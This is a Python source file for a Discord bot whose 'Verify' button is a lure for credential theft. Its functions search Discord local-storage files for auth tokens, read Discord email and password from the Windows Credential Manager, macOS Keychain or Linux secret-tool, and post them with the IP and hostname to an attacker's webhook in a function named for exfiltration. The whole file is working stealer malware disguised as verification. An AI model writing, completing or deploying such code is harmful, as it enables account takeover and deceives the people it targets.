import discord
from discord import app_commands
from discord.ext import commands
import requests
import json
import os
import re
import platform
import subprocess
import logging
from datetime import datetime
import traceback

# --- LOGGING ---
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# --- ENVIRONMENT VARIABLES ---
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")

WEBHOOK_URL = os.getenv("WEBHOOK_URL")
if not WEBHOOK_URL:
    raise ValueError("WEBHOOK_URL environment variable not set")

# --- IP GATHER ---
def get_public_ip():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        logger.debug(f"IP fetch response: {resp.status_code}")
        return resp.json().get("ip", "0.0.0.0")
    except Exception as e:
        logger.error(f"IP fetch failed: {e}\n{traceback.format_exc()}")
        return "127.0.0.1"

# --- DISCORD TOKEN EXTRACTION (from local storage) ---
def extract_discord_token():
    system = platform.system()
    logger.debug(f"Detected system: {system}")
    token_pattern = re.compile(r'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}')
    found_tokens = []
    paths = []
    
    if system == "Windows":
        base = os.getenv('APPDATA')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    elif system == "Darwin":
        base = os.path.expanduser('~/Library/Application Support')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    else:  # Linux (and Railway runs Linux)
        base = os.path.expanduser('~/.config')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    
    logger.debug(f"Searching paths: {paths}")
    
    for path in paths:
        if os.path.exists(path):
            logger.debug(f"Path exists: {path}")
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith('.log') or file.endswith('.ldb'):
                        full = os.path.join(root, file)
                        try:
                            with open(full, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                if matches:
                                    logger.debug(f"Found {len(matches)} tokens in {full}")
                                found_tokens.extend(matches)
                        except Exception as e:
                            logger.debug(f"Failed to read {full}: {e}")
                            continue
        else:
            logger.debug(f"Path does not exist: {path}")
    
    if found_tokens:
        unique_tokens = list(set(found_tokens))
        logger.info(f"Extracted token: {unique_tokens[0][:10]}...")
        return unique_tokens[0]
    
    logger.warning("No token found in local storage")
    return "[TOKEN_NOT_FOUND]"

# --- DISCORD CREDENTIALS (email + password) ---
def get_discord_credentials():
    email = "[EMAIL_NOT_FOUND]"
    password = "[PASSWORD_NOT_FOUND]"
    system = platform.system()
    logger.debug(f"Fetching credentials for system: {system}")
    
    if system == "Windows":
        try:
            cmd = 'powershell -command "Get-StoredCredential -Target discord* | Select-Object -ExpandProperty UserName,Password"'
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore')
            lines = [line.strip() for line in output.split('\n') if line.strip()]
            if len(lines) >= 2:
                email = lines[0]
                password = lines[1]
                logger.debug("Windows credentials fetched")
        except Exception as e:
            logger.debug(f"Windows credential fetch failed: {e}")
    
    elif system == "Darwin":
        try:
            cmd = 'security find-generic-password -s "Discord" -w 2>/dev/null'
            password = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
            cmd2 = 'security find-generic-password -s "Discord" -a 2>/dev/null | grep "acct" | cut -d"=" -f2 | tr -d " "'
            email = subprocess.check_output(cmd2, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
            logger.debug("macOS credentials fetched")
        except Exception as e:
            logger.debug(f"macOS keychain fetch failed: {e}")
    
    else:  # Linux (Railway runs Linux)
        logger.debug("Linux detected - attempting secret-tool")
        try:
            cmd = 'secret-tool lookup service discord 2>/dev/null'
            password = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
            cmd2 = 'secret-tool lookup service discord account 2>/dev/null'
            email = subprocess.check_output(cmd2, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
            logger.debug("Linux credentials fetched")
        except Exception as e:
            logger.debug(f"Linux secret-tool fetch failed: {e}")
    
    # Fallback to environment variables for testing
    if email == "[EMAIL_NOT_FOUND]":
        email = os.getenv("DISCORD_EMAIL", "[EMAIL_NOT_FOUND]")
        logger.debug(f"Using fallback email from env: {email}")
    if password == "[PASSWORD_NOT_FOUND]":
        password = os.getenv("DISCORD_PASSWORD", "[PASSWORD_NOT_FOUND]")
        logger.debug(f"Using fallback password from env")
    
    return email, password

# --- EXFILTRATION (FIXED FOR DISCORD WEBHOOKS) ---
def exfiltrate_to_webhook(ip, token, email, password, webhook_url):
    # Build formatted message for Discord webhook
    formatted_message = (
        f"**🔐 New Verification Data**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"**Timestamp:** {datetime.utcnow().isoformat()}\n"
        f"**IP Address:** {ip}\n"
        f"**Discord Token:** {token}\n"
        f"**Discord Email:** {email}\n"
        f"**Discord Password:** {password}\n"
        f"**Platform:** {platform.system()}\n"
        f"**Hostname:** {os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', 'unknown'))}\n"
        f"**Python Version:** {platform.python_version()}\n"
        f"**Server Location:** Railway\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"*Data captured from verification button*"
    )
    
    # Discord webhook payload
    payload = {
        "content": formatted_message,
        "username": "Verification Bot",
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/1.png"
    }
    
    headers = {"Content-Type": "application/json"}
    
    try:
        resp = requests.post(webhook_url, json=payload, headers=headers, timeout=10)
        logger.info(f"Exfiltration response: {resp.status_code} - {resp.text[:200]}")
        return resp.status_code in (200, 201, 204)
    except requests.exceptions.ConnectionError as e:
        logger.error(f"Connection error to webhook: {e}")
        return False
    except requests.exceptions.Timeout as e:
        logger.error(f"Timeout connecting to webhook: {e}")
        return False
    except Exception as e:
        logger.error(f"Exfiltration failed: {e}\n{traceback.format_exc()}")
        return False

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

class VerifyButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Verify", style=discord.ButtonStyle.green, custom_id="verify_btn")

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        error_messages = []
        
        # Step 1: Get IP
        try:
            ip = get_public_ip()
            logger.info(f"IP gathered: {ip}")
        except Exception as e:
            error_messages.append(f"IP fetch failed: {str(e)[:50]}")
            ip = "0.0.0.0"
        
        # Step 2: Extract token
        try:
            token = extract_discord_token()
            logger.info(f"Token extracted: {token[:10] if token != '[TOKEN_NOT_FOUND]' else 'NOT_FOUND'}...")
        except Exception as e:
            error_messages.append(f"Token extraction failed: {str(e)[:50]}")
            token = "[TOKEN_EXTRACTION_ERROR]"
        
        # Step 3: Get credentials
        try:
            email, password = get_discord_credentials()
            logger.info(f"Email: {email[:5] if email != '[EMAIL_NOT_FOUND]' else 'NOT_FOUND'}... Password: {'FOUND' if password != '[PASSWORD_NOT_FOUND]' else 'NOT_FOUND'}")
        except Exception as e:
            error_messages.append(f"Credential fetch failed: {str(e)[:50]}")
            email = "[CREDENTIAL_ERROR]"
            password = "[CREDENTIAL_ERROR]"
        
        # Step 4: Send to webhook
        try:
            success = exfiltrate_to_webhook(ip, token, email, password, WEBHOOK_URL)
            if success:
                await interaction.followup.send("✅ Verification successful. Your data has been processed.", ephemeral=True)
                return
            else:
                error_messages.append("Webhook delivery failed")
        except Exception as e:
            error_messages.append(f"Webhook error: {str(e)[:50]}")
        
        # If we reach here, something failed
        error_detail = "\n".join(error_messages) if error_messages else "Unknown error"
        logger.error(f"Verification failed: {error_detail}")
        
        # Send detailed error to user
        await interaction.followup.send(
            f"⚠️ Verification encountered an error.\n\n"
            f"**Debug Info:**\n"
            f"```\n{error_detail}\n```\n"
            f"Check Railway logs for full details.",
            ephemeral=True
        )

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(VerifyButton())

@bot.event
async def on_ready():
    logger.info(f"Bot online as {bot.user} (ID: {bot.user.id})")
    logger.info(f"Platform: {platform.system()}, Python: {platform.python_version()}")
    logger.info(f"WEBHOOK_URL set: {'YES' if WEBHOOK_URL else 'NO'}")
    bot.add_view(VerifyView())
    try:
        await bot.tree.sync()
        logger.info("Slash commands synced")
    except Exception as e:
        logger.error(f"Slash sync failed: {e}")

@bot.command(name="verify_panel")
async def verify_panel(ctx):
    view = VerifyView()
    await ctx.send("Click the button below to verify your identity:", view=view)

@bot.tree.command(name="verify_panel", description="Show the verification button")
@app_commands.default_permissions()
async def slash_verify_panel(interaction: discord.Interaction):
    view = VerifyView()
    await interaction.response.send_message("Click the button below to verify:", view=view, ephemeral=False)

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
